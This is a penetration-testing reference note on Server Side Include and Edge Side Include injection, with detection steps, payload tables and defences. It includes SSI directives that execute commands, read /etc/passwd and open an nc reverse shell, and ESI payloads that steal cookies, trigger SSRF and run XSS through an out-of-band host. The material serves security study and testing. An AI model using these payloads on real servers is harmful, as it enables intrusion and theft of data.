---
title: "Server Side Include (SSI) Injection & ESI"
type: technique
tags: [esi, exploitation, injection, rce, ssi, web]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-06-16
sources: [payloadsallthethings-ssi]
---

# Server Side Include (SSI) Injection

## What it is

Server Side Includes are directives the web server evaluates while serving an HTML page. If user input is reflected into a page the server parses for SSI, an attacker injects directives to read files or get RCE. The proxy-layer cousin, **ESI** (Edge Side Includes), is processed by caching surrogates and yields SSRF/XSS. Related: [[ssti]], [[xss]], [[wiki/techniques/web/ssrf]].

## How it works
The server (Apache `mod_include`, nginx SSI module, IIS) parses files - typically `.shtml`/`.stm`/`.shtm`, or any type when `Options +Includes`/`XBitHack` is on - for `<!--#directive ... -->`. Reflected user input inside such a page is executed. ESI works the same way but at a caching proxy (Varnish/Squid/Fastly/Akamai/Oracle) that cannot tell genuine ESI tags from ones you inject into the upstream response.

## Detection
Inject SSI metacharacters and look for evaluation/errors: `<!--#echo var="DATE_LOCAL" -->` (prints the date) or a broken `<!--#` (server error). For ESI, reflect `<esi:include src=http://OOB>` and watch for an OOB hit.

## Methodology & payloads (SSI)
Standard format: `<!--#directive param="value" -->`
| Description | Payload |
| --- | --- |
| Print the date | `<!--#echo var="DATE_LOCAL" -->` |
| Print document name | `<!--#echo var="DOCUMENT_NAME" -->` |
| Print all variables | `<!--#printenv -->` |
| Set a variable | `<!--#set var="name" value="x" -->` |
| Include a file | `<!--#include file="/etc/passwd" -->` / `virtual="/index.html"` |
| **Execute commands (RCE)** | `<!--#exec cmd="id" -->` |
| **Reverse shell** | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |

## Edge Side Includes (ESI)
A surrogate that processes ESI will evaluate tags you inject into the HTTP response body. Some require `Surrogate-Control: content="ESI/1.0"`. Fingerprint the surrogate (`Surrogate-Control`, `X-ESI`, vendor headers) first.
| Description | Payload |
| --- | --- |
| Blind detection (SSRF) | `<esi:include src=http://[OOB]>` |
| XSS | `<esi:include src=http://[OOB]/xss.html>` |
| Cookie theft | `<esi:include src=http://[OOB]/?c=$(HTTP_COOKIE)>` |
| Local file | `<esi:include src="supersecret.txt">` |
| Debug | `<esi:debug/>` |
| Add header / open redirect | `<!--esi $add_header('Location','http://[OOB]') -->` |
| Inline fragment XSS | `<esi:inline name="/x.html" fetchable="yes"><script>alert(1)</script></esi:inline>` |

ESI that supports XSLT (`<esi:include ... dca="xslt">`) can chain to [[xxe]]/file read.

## Real-world
ESI injection was popularized by GoSecure's research (Oracle/Akamai/Varnish/Fastly surrogates); SSI RCE still appears on legacy Apache apps and CTFs where `.shtml` or `mod_include` is enabled.

## Detection and defence
Disable `Includes`/`mod_include` where not needed (or `IncludesNOEXEC` to block `#exec`); HTML-encode user input before it reaches an SSI-parsed page; strip/encode `<esi:` from upstream responses at the surrogate; do not reflect raw input into cached responses.

## Tools
- [SSTImap](https://github.com/vladko312/SSTImap) - automatic SSTI/SSI detection (`-e SSI`):
```bash
python3 sstimap.py -u 'https://example.com/page?name=test*' -e SSI
```
- Burp + Collaborator for ESI OOB. See [[ssti]].

## Sources
- PayloadsAllTheThings - Server Side Inclusion / ESI
